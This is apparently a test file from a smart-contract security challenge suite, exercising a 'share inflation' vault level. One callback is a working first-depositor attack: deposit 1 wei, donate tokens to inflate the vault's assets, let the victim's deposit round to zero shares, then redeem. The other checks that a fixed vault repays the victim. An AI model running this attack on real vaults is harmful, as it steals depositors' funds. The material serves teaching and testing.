const { expect } = require("chai");
const { ethers } = require("ethers");
const { challengeSuite } = require("./harness");
const { at } = require("../lib/artifacts");
const mod = require("../lib/challenges/04-share-inflation");

challengeSuite(
  mod,
  async (ctx, s) => {
    const { player } = ctx.signers;
    const token = at("DVToken", s.token, player);
    const vault = at(s.contract, s.vault, player);
    await (await token.approve(s.vault, ethers.MaxUint256)).wait();
    await (await vault.deposit(1n)).wait(); // 1 wei -> tiny share supply
    await (await token.transfer(s.vault, ethers.parseEther("10"))).wait(); // donate: inflate totalAssets()
    await mod.bots.aliceDeposits(ctx, s); // Alice's 10 DVT now round down to 0 shares (vulnerable)
    await (await vault.redeem(await vault.shares(player.address))).wait();
  },
  async (ctx, s) => {
    await mod.bots.aliceDeposits(ctx, s);
    const vault = at(s.contract, s.vault, ctx.signers.victim);
    await (await vault.redeem(await vault.shares(ctx.signers.victim.address))).wait();
    const back = await at("DVToken", s.token, ctx.provider).balanceOf(ctx.signers.victim.address);
    expect(back).to.be.closeTo(ethers.parseEther("10"), 2n);
  }
);
